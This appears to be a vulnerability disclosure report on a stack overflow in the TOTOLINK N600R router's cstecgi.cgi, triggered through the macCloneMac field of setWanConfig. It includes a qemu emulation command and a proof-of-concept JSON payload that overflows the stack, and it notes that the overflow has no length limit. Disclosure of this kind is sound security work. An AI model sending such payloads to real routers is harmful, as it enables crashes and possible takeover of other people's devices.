# TOTOLINK-N600R-setWanConfig-StackOverflow

﻿During my internship at Qi An Xin Tiangong Lab, I discovered a StackOverflow vulnerability in the TOTOLINK-N600R router.

By analyzing the cstecgi.cgi file in the cgi-bin directory, I found that the function at address 0x420CD0 contains a stack overflow vulnerability.

The stack overflow can be triggered by the macCloneMac key value, which leads to a strcat overflow.

![image-20241219144819116](https://gitee.com/xyqer/pic/raw/master/202412191448022.png)

## How can we simulate a router

﻿Use the following command to simulate with qemu.

```bash
sudo chroot . ./qemu-mips-static -E CONTENT_LENGTH=300 -E QUERY_STRING="action=no" -L /lib ./web_cste/cgi-bin/cstecgi_patch.cgi < ./poc.json
```

﻿The content of the **poc.json** file is as follows:

```json
{"data":"1234","topicurl":"setWanConfig","macCloneMac":"aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa","wanMode":"2"}
```

## Attack result

![image-20241216153650090](https://gitee.com/xyqer/pic/raw/master/202412191450704.png)

![image-20241216153701799](https://gitee.com/xyqer/pic/raw/master/202412191450294.png)

﻿You can see that the stack length is only 0x1b8, but we overflowed to 0x1c0. If needed, we can overflow more. This overflow does not have a length limit. When using a longer overflow, you only need to modify the macCloneMac key value and the CONTENT_LENGTH size.